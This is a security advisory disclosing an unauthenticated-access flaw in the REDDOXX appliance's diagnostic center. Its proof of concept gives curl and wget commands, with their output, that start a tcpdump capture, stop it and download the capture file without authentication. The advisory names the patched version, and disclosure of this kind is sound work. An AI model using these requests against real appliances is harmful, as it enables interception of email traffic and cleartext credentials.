Subject: [FD] [RT-SA-2017-008] Unauthenticated Access to Diagnostic
 Functions in REDDOXX Appliance

Advisory: Unauthenticated Access to Diagnostic Functions in REDDOXX Appliance

RedTeam Pentesting discovered a vulnerability which allows attackers
unauthenticated access to the diagnostic functions of the administrative
interface of the REDDOXX appliance. The functions allow, for example, to
capture network traffic on the appliance's interfaces.


Details
=======

Product: REDDOXX Appliance
Affected Versions: Build 2032 / v2.0.625, older versions likely affected too
Fixed Versions: Version 2032 SP2
Vulnerability Type: Authentication Bypass
Security Risk: high
Vendor URL: https://www.reddoxx.com/
Vendor Status: patch available
Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2017-008
Advisory Status: published
CVE: GENERIC-MAP-NOMATCH
CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH

(from the vendor's homepage)


More Details
============

The administrative interface of the REDDOXX appliance [0] offers several
diagnostic tools in the "Diagnostic Center". Tcpdump is one of these
tools. This tool can be used to capture network traffic on local
interfaces.

During a penetration test, it was discovered that this function, as well
as the other diagnostic functions, does not require authentication.


Proof of Concept
================

The following curl command-line can be used to start the capture
process:

------------------------------------------------------------------------
$ curl --include --silent -H 'Content-Type: application/json' \
--data-binary '{"Name":"Tcpdump","Parameter":{"host":"","port":""}}' \
http://www.example.com/api/v1/rws/diagnose/start
HTTP/1.1 200 OK
Date: Thu, 18 May 2017 14:58:22 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.14
[...]
Content-Length: 0
Content-Type: application/xml
------------------------------------------------------------------------

The following curl command-line stops the capture process:

------------------------------------------------------------------------
$ curl --include --silent -H 'Content-Type: application/json' \
--data-binary '{"Name":"Tcpdump"}' \
http://www.example.com/api/v1/rws/diagnose/stop
HTTP/1.1 200 OK
Date: Thu, 18 May 2017 15:00:17 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.14
[...]
Content-Length: 0
Content-Type: application/xml
------------------------------------------------------------------------

After the capture process is complete, the resulting capture file can be
downloaded without authentication:

------------------------------------------------------------------------
$ wget http://www.example.com/rws/resources/diagnosemanager/tcpdump.cap
[...]
Connecting to www.example.com:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1801530 (1.7M) [application/vnd.tcpdump.pcap]
Saving to: ‘tcpdump.cap’
tcpdump.cap 100%[=======================================>]
1.72M [...]
2017-05-18 17:01:36 (34.1 MB/s) - ‘tcpdump.cap’ saved [1801530/1801530]
------------------------------------------------------------------------

None of these requests contain any credentials or cookies, which could
provide authentication.


Workaround
==========

None


Fix
===

Update the appliance software to Version 2032 SP2.


Security Risk
=============

The diagnostic functions of the REDDOXX appliance can be used without
authentication. This allows attackers to, for example, capture network
traffic. During a penetration test it was possible to capture multiple
emails and also POP3 login attempts with cleartext credentials. This is
rated as a high risk.
